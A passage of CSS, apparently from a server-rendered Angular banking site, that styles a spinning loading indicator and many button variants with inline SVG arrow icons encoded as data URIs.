      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%0A%3C%21--%20Generator%3A%20Adobe%20Illustrator%2019.1.0%2C%20SVG%20Export%20Plug-In%20.%20SVG%20Version%3A%206.00%20Build%200%29%20%20--%3E%0A%3Csvg%20version%3D%221.1%22%20id%3D%22Layer_1%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20x%3D%220px%22%20y%3D%220px%22%0A%09%20viewBox%3D%220%200%2030%2030%22%20style%3D%22enable-background%3Anew%200%200%2030%2030%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text/css%22%3E%0A%09.Drop_x0020_Shadow%7Bfill%3Anone%3B%7D%0A%09.Round_x0020_Corners_x0020_2_x0020_pt%7Bfill%3A%23FFFFFF%3Bstroke%3A%23000000%3Bstroke-miterlimit%3A10%3B%7D%0A%09.Live_x0020_Reflect_x0020_X%7Bfill%3Anone%3B%7D%0A%09.Bevel_x0020_Soft%7Bfill%3Aurl%28%23SVGID_1_%29%3B%7D%0A%09.Dusk%7Bfill%3A%23FFFFFF%3B%7D%0A%09.Foliage_GS%7Bfill%3A%23FFDD00%3B%7D%0A%09.Pompadour_GS%7Bfill-rule%3Aevenodd%3Bclip-rule%3Aevenodd%3Bfill%3A%2344ADE2%3B%7D%0A%09.st0%7Bfill%3Anone%3B%7D%0A%09.st1%7Bfill%3A%23056EAE%3B%7D%0A%3C/style%3E%0A%3ClinearGradient%20id%3D%22SVGID_1_%22%20gradientUnits%3D%22userSpaceOnUse%22%20x1%3D%220%22%20y1%3D%220%22%20x2%3D%220.7071%22%20y2%3D%220.7071%22%3E%0A%09%3Cstop%20%20offset%3D%220%22%20style%3D%22stop-color%3A%23DEDFE3%22/%3E%0A%09%3Cstop%20%20offset%3D%220.1738%22%20style%3D%22stop-color%3A%23D8D9DD%22/%3E%0A%09%3Cstop%20%20offset%3D%220.352%22%20style%3D%22stop-color%3A%23C9CACD%22/%3E%0A%09%3Cstop%20%20offset%3D%220.5323%22%20style%3D%22stop-color%3A%23B4B5B8%22/%3E%0A%09%3Cstop%20%20offset%3D%220.7139%22%20style%3D%22stop-color%3A%23989A9C%22/%3E%0A%09%3Cstop%20%20offset%3D%220.8949%22%20style%3D%22stop-color%3A%23797C7E%22/%3E%0A%09%3Cstop%20%20offset%3D%221%22%20style%3D%22stop-color%3A%23656B6C%22/%3E%0A%3C/linearGradient%3E%0A%3Cg%3E%0A%09%3Crect%20x%3D%220%22%20class%3D%22st0%22%20width%3D%2230%22%20height%3D%2230%22/%3E%0A%09%3Cpath%20class%3D%22st1%22%20d%3D%22M2.2%2C17.5C2.1%2C16.7%2C2%2C15.8%2C2%2C15C2%2C7.8%2C7.8%2C2%2C15%2C2s13%2C5.8%2C13%2C13c0%2C0.8-0.1%2C1.7-0.2%2C2.5h2%0A%09%09c0.1-0.8%2C0.2-1.6%2C0.2-2.5c0-8.3-6.7-15-15-15S0%2C6.7%2C0%2C15c0%2C0.8%2C0.1%2C1.7%2C0.2%2C2.5H2.2z%22/%3E%0A%3C/g%3E%0A%3C/svg%3E%0A");
      background-repeat: no-repeat;
      -webkit-animation: 1.16s linear infinite spin;
      animation: 1.16s linear infinite spin
    }

    .jamp.jamp-css.white[_ngcontent-ssr-c56] .loading[_ngcontent-ssr-c56] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%0A%3C%21--%20Generator%3A%20Adobe%20Illustrator%2019.2.1%2C%20SVG%20Export%20Plug-In%20.%20SVG%20Version%3A%206.00%20Build%200%29%20%20--%3E%0A%3Csvg%20version%3D%221.1%22%20id%3D%22Layer_1%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20x%3D%220px%22%20y%3D%220px%22%0A%09%20viewBox%3D%220%200%2030%2030%22%20style%3D%22enable-background%3Anew%200%200%2030%2030%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text/css%22%3E%0A%09.st0%7Bfill%3Anone%3B%7D%0A%09.st1%7Bfill%3A%23FFFFFF%3B%7D%0A%3C/style%3E%0A%3Cg%3E%0A%09%3Crect%20class%3D%22st0%22%20width%3D%2230%22%20height%3D%2230%22/%3E%0A%09%3Cpath%20class%3D%22st1%22%20d%3D%22M2.2%2C17.5C2.1%2C16.7%2C2%2C15.8%2C2%2C15C2%2C7.8%2C7.8%2C2%2C15%2C2s13%2C5.8%2C13%2C13c0%2C0.8-0.1%2C1.7-0.2%2C2.5h2%0A%09%09c0.1-0.8%2C0.2-1.6%2C0.2-2.5c0-8.3-6.7-15-15-15S0%2C6.7%2C0%2C15c0%2C0.8%2C0.1%2C1.7%2C0.2%2C2.5H2.2z%22/%3E%0A%3C/g%3E%0A%3C/svg%3E%0A");
      background-repeat: no-repeat
    }

    @-webkit-keyframes spin {
      0% {
        transform: rotate(0)
      }

      100% {
        transform: rotate(360deg)
      }
    }

    @keyframes spin {
      0% {
        transform: rotate(0)
      }

      100% {
        transform: rotate(360deg)
      }
    }

    .jamp-page-level[_nghost-ssr-c56] {
      background: rgba(255, 255, 255, .9);
      position: fixed;
      z-index: 100;
      top: 0;
      right: 0;
      bottom: 0;
      left: 0
    }

    .jamp-page-level[_nghost-ssr-c56] .row[_ngcontent-ssr-c56] {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%)
    }

    .jamp-center-css[_ngcontent-ssr-c56] {
      width: calc(100% - 60px);
      max-height: calc(100% - 60px);
      position: absolute !important;
      top: 50% !important;
      left: 50% !important;
      transform: translate(-50%, -50%)
    }

    .jamp[_ngcontent-ssr-c56] {
      position: relative !important;
      top: 50% !important;
      left: 0 !important;
      text-align: center !important;
      transform: translateY(-50%) !important;
      margin: 0
    }

    .fillHeight[_ngcontent-ssr-c56] {
      min-height: 100%;
      height: 100%
    }

    .position-initial[_ngcontent-ssr-c56] {
      position: initial
    }

    .citi-modal [_nghost-ssr-c56] .jamp[_ngcontent-ssr-c56] {
      margin: 30px 0 10px
    }
  </style>
  <style>
    @charset "UTF-8";

    .btn-primary.btn_white[_ngcontent-ssr-c55],
    .btn_white[_ngcontent-ssr-c55] {
      background-color: #fff;
      color: #056dae;
      border-color: #fff
    }

    .btn-primary.btn_white[_ngcontent-ssr-c55]:focus,
    .btn-primary.btn_white[_ngcontent-ssr-c55]:hover,
    .btn_white[_ngcontent-ssr-c55]:focus,
    .btn_white[_ngcontent-ssr-c55]:hover {
      background-color: #056dae;
      color: #fff;
      border-color: #056dae
    }

    .btn-primary.btn_white_on_blue[_ngcontent-ssr-c55],
    .btn_white_on_blue[_ngcontent-ssr-c55] {
      background-color: #fff;
      color: #056dae;
      border-color: #fff
    }

    .btn-primary.btn_white_on_blue[_ngcontent-ssr-c55]:focus,
    .btn-primary.btn_white_on_blue[_ngcontent-ssr-c55]:hover,
    .btn_white_on_blue[_ngcontent-ssr-c55]:focus,
    .btn_white_on_blue[_ngcontent-ssr-c55]:hover {
      background-color: #002a54;
      color: #fff;
      border-color: #002a54
    }

    .btn_dark_priority[_ngcontent-ssr-c55] {
      background-color: #0e2a48;
      color: #fff;
      border-color: #0e2a48
    }

    .btn_dark_priority[_ngcontent-ssr-c55]:focus,
    .btn_dark_priority[_ngcontent-ssr-c55]:hover {
      background-color: #091022;
      border-color: #091022
    }

    .btn-primary.btn_light_priority[_ngcontent-ssr-c55],
    .btn_light_priority[_ngcontent-ssr-c55] {
      background-color: #fff;
      color: #000;
      border-color: #fff
    }

    .btn-primary.btn_light_priority[_ngcontent-ssr-c55]:focus,
    .btn-primary.btn_light_priority[_ngcontent-ssr-c55]:hover,
    .btn_light_priority[_ngcontent-ssr-c55]:focus,
    .btn_light_priority[_ngcontent-ssr-c55]:hover {
      background-color: #65778a;
      color: #fff;
      border-color: #65778a
    }

    .btn.btn-white-disabled[_ngcontent-ssr-c55] {
      border-color: #fff;
      color: #fff;
      background-color: transparent;
      opacity: 1
    }

    .btn.btn-white-disabled[_ngcontent-ssr-c55]:hover {
      border-color: #fff;
      color: #fff
    }

    .btn.btn-dark-disabled[_ngcontent-ssr-c55] {
      border-color: #666;
      opacity: .5;
      color: #666;
      background-color: transparent
    }

    .btn.btn-dark-disabled[_ngcontent-ssr-c55]:hover {
      border-color: #666;
      color: #666
    }

    .btn_dark_arrow_right[_ngcontent-ssr-c55] {
      background-color: #0e2a48;
      color: #fff;
      border-color: #0e2a48
    }

    .btn_dark_arrow_right[_ngcontent-ssr-c55]:focus,
    .btn_dark_arrow_right[_ngcontent-ssr-c55]:hover {
      background-color: #091022;
      border-color: #091022
    }

    .btn_dark_arrow_left[_ngcontent-ssr-c55] {
      background-color: #0e2a48;
      color: #fff;
      border-color: #0e2a48;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E03-glyph-left-white%3C/title%3E%3Cpath d='M23,27a1,1,0,0,1-.68-.27l-5.72-5.32a1.91,1.91,0,0,1,0-2.82l5.72-5.32a1,1,0,1,1,1.36,1.46L18,20l5.66,5.27a1,1,0,0,1,0,1.41A1,1,0,0,1,23,27' transform='translate(-15.99 -13)' style='fill:%23ffffff;fill-rule:evenodd'/%3E%3C/svg%3E")
    }

    .btn_dark_arrow_left[_ngcontent-ssr-c55]:focus,
    .btn_dark_arrow_left[_ngcontent-ssr-c55]:hover {
      background-color: #091022;
      color: #fff;
      border-color: #091022;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E03-glyph-left-white%3C/title%3E%3Cpath d='M23,27a1,1,0,0,1-.68-.27l-5.72-5.32a1.91,1.91,0,0,1,0-2.82l5.72-5.32a1,1,0,1,1,1.36,1.46L18,20l5.66,5.27a1,1,0,0,1,0,1.41A1,1,0,0,1,23,27' transform='translate(-15.99 -13)' style='fill:%23ffffff;fill-rule:evenodd'/%3E%3C/svg%3E")
    }

    .btn_white_arrow_left[_ngcontent-ssr-c55] {
      background-color: #fff;
      color: #056dae;
      border-color: #fff;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E03-glyph-left-white%3C/title%3E%3Cpath d='M23,27a1,1,0,0,1-.68-.27l-5.72-5.32a1.91,1.91,0,0,1,0-2.82l5.72-5.32a1,1,0,1,1,1.36,1.46L18,20l5.66,5.27a1,1,0,0,1,0,1.41A1,1,0,0,1,23,27' transform='translate(-15.99 -13)' style='fill:%23056dae;fill-rule:evenodd'/%3E%3C/svg%3E") !important
    }

    .btn_white_arrow_left[_ngcontent-ssr-c55]:focus,
    .btn_white_arrow_left[_ngcontent-ssr-c55]:hover {
      background-color: #056dae;
      color: #fff;
      border-color: #056dae;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E03-glyph-left-white%3C/title%3E%3Cpath d='M23,27a1,1,0,0,1-.68-.27l-5.72-5.32a1.91,1.91,0,0,1,0-2.82l5.72-5.32a1,1,0,1,1,1.36,1.46L18,20l5.66,5.27a1,1,0,0,1,0,1.41A1,1,0,0,1,23,27' transform='translate(-15.99 -13)' style='fill:%23ffffff;fill-rule:evenodd'/%3E%3C/svg%3E") !important
    }

    .btn_white_arrow_right[_ngcontent-ssr-c55] {
      background-color: #fff;
      color: #056dae;
      border-color: #fff;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E04-glyph-right-white%3C/title%3E%3Cpath d='M17,27a1,1,0,0,1-.68-1.73L22,20l-5.66-5.27a1,1,0,0,1,1.36-1.46l5.72,5.32a1.91,1.91,0,0,1,0,2.82l-5.72,5.32A1,1,0,0,1,17,27' transform='translate(-15.99 -13)' style='fill:%23056dae;fill-rule:evenodd'/%3E%3C/svg%3E") !important
    }

    .btn_white_arrow_right[_ngcontent-ssr-c55]:focus,
    .btn_white_arrow_right[_ngcontent-ssr-c55]:hover {
      background-color: #056dae;
      color: #fff;
      border-color: #056dae;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E04-glyph-right-white%3C/title%3E%3Cpath d='M17,27a1,1,0,0,1-.68-1.73L22,20l-5.66-5.27a1,1,0,0,1,1.36-1.46l5.72,5.32a1.91,1.91,0,0,1,0,2.82l-5.72,5.32A1,1,0,0,1,17,27' transform='translate(-15.99 -13)' style='fill:%23ffffff;fill-rule:evenodd'/%3E%3C/svg%3E") !important
    }

    .btn_blue_hover_arrow_left[_ngcontent-ssr-c55] {
      background-color: #fff;
      color: #056dae;
      border-color: #fff;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E03-glyph-left-white%3C/title%3E%3Cpath d='M23,27a1,1,0,0,1-.68-.27l-5.72-5.32a1.91,1.91,0,0,1,0-2.82l5.72-5.32a1,1,0,1,1,1.36,1.46L18,20l5.66,5.27a1,1,0,0,1,0,1.41A1,1,0,0,1,23,27' transform='translate(-15.99 -13)' style='fill:%23056dae;fill-rule:evenodd'/%3E%3C/svg%3E") !important
    }

    .btn_blue_hover_arrow_left[_ngcontent-ssr-c55]:focus,
    .btn_blue_hover_arrow_left[_ngcontent-ssr-c55]:hover {
      background-color: #65778a;
      color: #fff;
      border-color: #65778a;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E03-glyph-left-white%3C/title%3E%3Cpath d='M23,27a1,1,0,0,1-.68-.27l-5.72-5.32a1.91,1.91,0,0,1,0-2.82l5.72-5.32a1,1,0,1,1,1.36,1.46L18,20l5.66,5.27a1,1,0,0,1,0,1.41A1,1,0,0,1,23,27' transform='translate(-15.99 -13)' style='fill:%23ffffff;fill-rule:evenodd'/%3E%3C/svg%3E") !important
    }

    .btn_blue_hover_arrow_right[_ngcontent-ssr-c55] {
      background-color: #fff;
      color: #056dae;
      border-color: #fff;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E04-glyph-right-white%3C/title%3E%3Cpath d='M17,27a1,1,0,0,1-.68-1.73L22,20l-5.66-5.27a1,1,0,0,1,1.36-1.46l5.72,5.32a1.91,1.91,0,0,1,0,2.82l-5.72,5.32A1,1,0,0,1,17,27' transform='translate(-15.99 -13)' style='fill:%23056dae;fill-rule:evenodd'/%3E%3C/svg%3E") !important
    }

    .btn_blue_hover_arrow_right[_ngcontent-ssr-c55]:focus,
    .btn_blue_hover_arrow_right[_ngcontent-ssr-c55]:hover {
      background-color: #65778a;
      color: #fff;
      border-color: #65778a;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E04-glyph-right-white%3C/title%3E%3Cpath d='M17,27a1,1,0,0,1-.68-1.73L22,20l-5.66-5.27a1,1,0,0,1,1.36-1.46l5.72,5.32a1.91,1.91,0,0,1,0,2.82l-5.72,5.32A1,1,0,0,1,17,27' transform='translate(-15.99 -13)' style='fill:%23ffffff;fill-rule:evenodd'/%3E%3C/svg%3E") !important
    }

    .btn_white_priority_arrow_left[_ngcontent-ssr-c55] {
      background-color: #fff;
      color: #0e2a48;
      border-color: #fff;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E03-glyph-left-white%3C/title%3E%3Cpath d='M23,27a1,1,0,0,1-.68-.27l-5.72-5.32a1.91,1.91,0,0,1,0-2.82l5.72-5.32a1,1,0,1,1,1.36,1.46L18,20l5.66,5.27a1,1,0,0,1,0,1.41A1,1,0,0,1,23,27' transform='translate(-15.99 -13)' style='fill:%230e2a48;fill-rule:evenodd'/%3E%3C/svg%3E") !important
    }

    .btn_white_priority_arrow_left[_ngcontent-ssr-c55]:focus,
    .btn_white_priority_arrow_left[_ngcontent-ssr-c55]:hover {
      background-color: #65778a;
      color: #fff;
      border-color: #65778a;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E03-glyph-left-white%3C/title%3E%3Cpath d='M23,27a1,1,0,0,1-.68-.27l-5.72-5.32a1.91,1.91,0,0,1,0-2.82l5.72-5.32a1,1,0,1,1,1.36,1.46L18,20l5.66,5.27a1,1,0,0,1,0,1.41A1,1,0,0,1,23,27' transform='translate(-15.99 -13)' style='fill:%23ffffff;fill-rule:evenodd'/%3E%3C/svg%3E") !important
    }

    .btn_white_priority_arrow_right[_ngcontent-ssr-c55] {
      background-color: #fff !important;
      color: #0e2a48 !important;
      border-color: #fff !important;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E04-glyph-right-white%3C/title%3E%3Cpath d='M17,27a1,1,0,0,1-.68-1.73L22,20l-5.66-5.27a1,1,0,0,1,1.36-1.46l5.72,5.32a1.91,1.91,0,0,1,0,2.82l-5.72,5.32A1,1,0,0,1,17,27' transform='translate(-15.99 -13)' style='fill:%230e2a48;fill-rule:evenodd'/%3E%3C/svg%3E") !important
    }

    .btn_white_priority_arrow_right[_ngcontent-ssr-c55]:focus,
    .btn_white_priority_arrow_right[_ngcontent-ssr-c55]:hover {
      background-color: #65778a !important;
      color: #fff !important;
      border-color: #65778a !important;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E04-glyph-right-white%3C/title%3E%3Cpath d='M17,27a1,1,0,0,1-.68-1.73L22,20l-5.66-5.27a1,1,0,0,1,1.36-1.46l5.72,5.32a1.91,1.91,0,0,1,0,2.82l-5.72,5.32A1,1,0,0,1,17,27' transform='translate(-15.99 -13)' style='fill:%23ffffff;fill-rule:evenodd'/%3E%3C/svg%3E") !important
    }

    .btn_gold[_ngcontent-ssr-c55] {
      background-color: #8e6f32;
      color: #fff;
      border-color: #8e6f32
    }

    .btn_gold[_ngcontent-ssr-c55]:focus,
    .btn_gold[_ngcontent-ssr-c55]:hover {
      background-color: #745b2d;
      color: #fff;
      border-color: #745b2d
    }

    .btn_gold.disabled[_ngcontent-ssr-c55],
    .btn_gold.disabled[_ngcontent-ssr-c55]:focus,
    .btn_gold.disabled[_ngcontent-ssr-c55]:hover,
    .btn_gold[disabled][_ngcontent-ssr-c55],
    .btn_gold[disabled][_ngcontent-ssr-c55]:focus,
    .btn_gold[disabled][_ngcontent-ssr-c55]:hover {
      color: rgba(0, 0, 0, .5);
      border-color: rgba(0, 0, 0, .5)
    }

    .gold_arrow_right[_ngcontent-ssr-c55],
    .gold_arrow_right[_ngcontent-ssr-c55]:focus,
    .gold_arrow_right[_ngcontent-ssr-c55]:hover {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E04-glyph-right-white%3C/title%3E%3Cpath d='M17,27a1,1,0,0,1-.68-1.73L22,20l-5.66-5.27a1,1,0,0,1,1.36-1.46l5.72,5.32a1.91,1.91,0,0,1,0,2.82l-5.72,5.32A1,1,0,0,1,17,27' transform='translate(-15.99 -13)' style='fill:%23ffffff;fill-rule:evenodd'/%3E%3C/svg%3E")
    }

    .gold_arrow_right.disabled[_ngcontent-ssr-c55],
    .gold_arrow_right[disabled][_ngcontent-ssr-c55] {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E04-glyph-right-white%3C/title%3E%3Cpath d='M17,27a1,1,0,0,1-.68-1.73L22,20l-5.66-5.27a1,1,0,0,1,1.36-1.46l5.72,5.32a1.91,1.91,0,0,1,0,2.82l-5.72,5.32A1,1,0,0,1,17,27' transform='translate(-15.99 -13)' style='fill:rgba(0, 0, 0, 0.5);fill-rule:evenodd'/%3E%3C/svg%3E")
    }

    .gold_arrow_left[_ngcontent-ssr-c55],
    .gold_arrow_left[_ngcontent-ssr-c55]:focus,
    .gold_arrow_left[_ngcontent-ssr-c55]:hover {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E03-glyph-left-white%3C/title%3E%3Cpath d='M23,27a1,1,0,0,1-.68-.27l-5.72-5.32a1.91,1.91,0,0,1,0-2.82l5.72-5.32a1,1,0,1,1,1.36,1.46L18,20l5.66,5.27a1,1,0,0,1,0,1.41A1,1,0,0,1,23,27' transform='translate(-15.99 -13)' style='fill:%23ffffff;fill-rule:evenodd'/%3E%3C/svg%3E")
    }

    .gold_arrow_left.disabled[_ngcontent-ssr-c55],
    .gold_arrow_left[disabled][_ngcontent-ssr-c55] {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E03-glyph-left-white%3C/title%3E%3Cpath d='M23,27a1,1,0,0,1-.68-.27l-5.72-5.32a1.91,1.91,0,0,1,0-2.82l5.72-5.32a1,1,0,1,1,1.36,1.46L18,20l5.66,5.27a1,1,0,0,1,0,1.41A1,1,0,0,1,23,27' transform='translate(-15.99 -13)' style='fill:rgba(0, 0, 0, 0.5);fill-rule:evenodd'/%3E%3C/svg%3E")
    }

    .dark.btn_gold[_ngcontent-ssr-c55],
    .theme-dark[_nghost-ssr-c55] .btn_gold[_ngcontent-ssr-c55],
    .theme-dark [_nghost-ssr-c55] .btn_gold[_ngcontent-ssr-c55],
    .cta-bg-dark[_nghost-ssr-c55] .btn_gold[_ngcontent-ssr-c55],
    .cta-bg-dark [_nghost-ssr-c55] .btn_gold[_ngcontent-ssr-c55] {
      background-color: #fff;
      color: #8e6f32;
      border-color: #fff
    }

    .dark.btn_gold[_ngcontent-ssr-c55]:focus,
    .dark.btn_gold[_ngcontent-ssr-c55]:hover,
    .theme-dark[_nghost-ssr-c55] .btn_gold[_ngcontent-ssr-c55]:focus,
    .theme-dark [_nghost-ssr-c55] .btn_gold[_ngcontent-ssr-c55]:focus,
    .cta-bg-dark[_nghost-ssr-c55] .btn_gold[_ngcontent-ssr-c55]:focus,
    .cta-bg-dark [_nghost-ssr-c55] .btn_gold[_ngcontent-ssr-c55]:focus,
    .theme-dark[_nghost-ssr-c55] .btn_gold[_ngcontent-ssr-c55]:hover,
    .theme-dark [_nghost-ssr-c55] .btn_gold[_ngcontent-ssr-c55]:hover,
    .cta-bg-dark[_nghost-ssr-c55] .btn_gold[_ngcontent-ssr-c55]:hover,
    .cta-bg-dark [_nghost-ssr-c55] .btn_gold[_ngcontent-ssr-c55]:hover {
      background-color: #8e6f32;
      color: #fff;
      border-color: #8e6f32
    }

    .disabled.dark.btn_gold[_ngcontent-ssr-c55],
    .theme-dark[_nghost-ssr-c55] .disabled.btn_gold[_ngcontent-ssr-c55],
    .theme-dark [_nghost-ssr-c55] .disabled.btn_gold[_ngcontent-ssr-c55],
    .cta-bg-dark[_nghost-ssr-c55] .disabled.btn_gold[_ngcontent-ssr-c55],
    .cta-bg-dark [_nghost-ssr-c55] .disabled.btn_gold[_ngcontent-ssr-c55],
    .theme-dark[_nghost-ssr-c55] [disabled].btn_gold[_ngcontent-ssr-c55],
    .theme-dark [_nghost-ssr-c55] [disabled].btn_gold[_ngcontent-ssr-c55],
    .cta-bg-dark[_nghost-ssr-c55] [disabled].btn_gold[_ngcontent-ssr-c55],
    .cta-bg-dark [_nghost-ssr-c55] [disabled].btn_gold[_ngcontent-ssr-c55],
    [disabled].dark.btn_gold[_ngcontent-ssr-c55] {
      background-color: transparent;
      color: #fff;
      border-color: #fff
    }

    .dark.gold_arrow_right[_ngcontent-ssr-c55],
    .theme-dark[_nghost-ssr-c55] .gold_arrow_right[_ngcontent-ssr-c55],
    .theme-dark [_nghost-ssr-c55] .gold_arrow_right[_ngcontent-ssr-c55],
    .cta-bg-dark[_nghost-ssr-c55] .gold_arrow_right[_ngcontent-ssr-c55],
    .cta-bg-dark [_nghost-ssr-c55] .gold_arrow_right[_ngcontent-ssr-c55] {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E04-glyph-right-white%3C/title%3E%3Cpath d='M17,27a1,1,0,0,1-.68-1.73L22,20l-5.66-5.27a1,1,0,0,1,1.36-1.46l5.72,5.32a1.91,1.91,0,0,1,0,2.82l-5.72,5.32A1,1,0,0,1,17,27' transform='translate(-15.99 -13)' style='fill:%238e6f32;fill-rule:evenodd'/%3E%3C/svg%3E")
    }

    .dark.gold_arrow_right[_ngcontent-ssr-c55]:focus,
    .dark.gold_arrow_right[_ngcontent-ssr-c55]:hover,
    .theme-dark[_nghost-ssr-c55] .gold_arrow_right[_ngcontent-ssr-c55]:focus,
    .theme-dark [_nghost-ssr-c55] .gold_arrow_right[_ngcontent-ssr-c55]:focus,
    .cta-bg-dark[_nghost-ssr-c55] .gold_arrow_right[_ngcontent-ssr-c55]:focus,
    .cta-bg-dark [_nghost-ssr-c55] .gold_arrow_right[_ngcontent-ssr-c55]:focus,
    .theme-dark[_nghost-ssr-c55] .gold_arrow_right[_ngcontent-ssr-c55]:hover,
    .theme-dark [_nghost-ssr-c55] .gold_arrow_right[_ngcontent-ssr-c55]:hover,
    .cta-bg-dark[_nghost-ssr-c55] .gold_arrow_right[_ngcontent-ssr-c55]:hover,
    .cta-bg-dark [_nghost-ssr-c55] .gold_arrow_right[_ngcontent-ssr-c55]:hover {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E04-glyph-right-white%3C/title%3E%3Cpath d='M17,27a1,1,0,0,1-.68-1.73L22,20l-5.66-5.27a1,1,0,0,1,1.36-1.46l5.72,5.32a1.91,1.91,0,0,1,0,2.82l-5.72,5.32A1,1,0,0,1,17,27' transform='translate(-15.99 -13)' style='fill:%23ffffff;fill-rule:evenodd'/%3E%3C/svg%3E")
    }

    .disabled.dark.gold_arrow_right[_ngcontent-ssr-c55],
    .theme-dark[_nghost-ssr-c55] .disabled.gold_arrow_right[_ngcontent-ssr-c55],
    .theme-dark [_nghost-ssr-c55] .disabled.gold_arrow_right[_ngcontent-ssr-c55],
    .cta-bg-dark[_nghost-ssr-c55] .disabled.gold_arrow_right[_ngcontent-ssr-c55],
    .cta-bg-dark [_nghost-ssr-c55] .disabled.gold_arrow_right[_ngcontent-ssr-c55],
    .theme-dark[_nghost-ssr-c55] [disabled].gold_arrow_right[_ngcontent-ssr-c55],
    .theme-dark [_nghost-ssr-c55] [disabled].gold_arrow_right[_ngcontent-ssr-c55],
    .cta-bg-dark[_nghost-ssr-c55] [disabled].gold_arrow_right[_ngcontent-ssr-c55],
    .cta-bg-dark [_nghost-ssr-c55] [disabled].gold_arrow_right[_ngcontent-ssr-c55],
    [disabled].dark.gold_arrow_right[_ngcontent-ssr-c55] {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E04-glyph-right-white%3C/title%3E%3Cpath d='M17,27a1,1,0,0,1-.68-1.73L22,20l-5.66-5.27a1,1,0,0,1,1.36-1.46l5.72,5.32a1.91,1.91,0,0,1,0,2.82l-5.72,5.32A1,1,0,0,1,17,27' transform='translate(-15.99 -13)' style='fill:%23ffffff;fill-rule:evenodd'/%3E%3C/svg%3E")
    }

    .dark.gold_arrow_left[_ngcontent-ssr-c55],
    .theme-dark[_nghost-ssr-c55] .gold_arrow_left[_ngcontent-ssr-c55],
    .theme-dark [_nghost-ssr-c55] .gold_arrow_left[_ngcontent-ssr-c55],
    .cta-bg-dark[_nghost-ssr-c55] .gold_arrow_left[_ngcontent-ssr-c55],
    .cta-bg-dark [_nghost-ssr-c55] .gold_arrow_left[_ngcontent-ssr-c55] {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8.02 14'%3E%3Ctitle%3E03-glyph-left-white%3C/title%3E%3Cpath d='M23,27a1,1,0,0,1-.68-.27l-5.72-5.32a1.91,1.91,0,0,1,0-2.82l5.72-5.32a1,1,0,1,1,1.36,1.46L18,20l5.66,5.27a1,1,0,0,1,0,1.41A1,1,0,0,1,23,27' transform='translate(-15.99 -13)' style='fill:%238e6f32;fill-rule:evenodd'/%3E%3C/svg%3E")
    }

    .dark.gold_arrow_left[_ngcontent-ssr-c55]:focus,
    .dark.gold_arrow_left[_ngcontent-ssr-c55]:hover,
    .theme-dark[_nghost-ssr-c55] .gold_arrow_left[_ngcontent-ssr-c55]:focus,
    .theme-dark [_nghost-ssr-c55] .gold_arrow_left[_ngcontent-ssr-c55]:focus,
    .cta-bg-dark[_nghost-ssr-c55] .gold_arrow_left[_ngcontent-ssr-c55]:focus,
    .cta-bg-dark [_nghost-ssr-c55] .gold_arrow_left[_ngcontent-ssr-c55]:focus,
    .theme-dark[_nghost-ssr-c55] .gold_arrow_left[_ngcontent-ssr-c55]:hover,
